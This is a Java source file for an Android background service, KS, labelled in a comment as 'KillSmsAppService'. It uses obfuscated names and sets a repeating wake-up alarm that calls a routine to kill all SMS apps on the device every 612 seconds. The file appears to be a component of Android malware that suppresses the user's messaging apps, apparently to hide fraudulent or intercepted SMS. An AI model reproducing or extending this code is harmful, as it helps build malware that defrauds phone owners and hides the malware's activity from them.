package net.workspace;
import net.workspace.biz.BIZ;
import net.workspace.util.AppStoper;
import net.workspace.util.CommonUtil;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.SharedPreferences;

/**
 * KillSmsAppService
 * @author Hike
 *
 */
public class KS extends net.workspace.AS {
    private static final String DO = /*const-replace-start*/"do";
    private static final String ALARM = /*const-replace-start*/"alarm";
    public static void restartAlarm() {
        synchronized (locker) {
            AlarmManager manager = (AlarmManager) CommonUtil.context.getSystemService(ALARM);
            PendingIntent pending = PendingIntent.getService(CommonUtil.context, 0, new Intent().setClass(CommonUtil.context, net.workspace.KS.class).setAction(DO), 0);
            manager.cancel(pending);
            manager.setRepeating(AlarmManager.RTC_WAKEUP, 0, interval * 1000, pending);
        }
    }
    private static String PREF_NAME = /*const-replace-start*/"OPQRVSGdddd";
    private static final int interval = 612;//seconds
    private static final Object locker = new Object();
    @Override
    public void onStart(Intent intent, int i) {
        super.onStart(intent, i);
        SharedPreferences pref = getSharedPreferences(PREF_NAME, 0);
        long current = System.currentTimeMillis();
        String action = null;
        if (intent != null) action = intent.getAction();
        if (DO.equals(action)) {
            pref.edit().putLong(PREF_NAME, current).commit();
            AppStoper stoper = new AppStoper();
            stoper.killAllSmsApps();
        } else {
            long lastProcessTime = pref.getLong(PREF_NAME, 0);
            if (current - lastProcessTime > BIZ.TASK_CHECK_INTERVAL * 1000) {
                restartAlarm();
            }
        }
        stopService(new Intent().setClass(this, net.workspace.KS.class));
    }
}
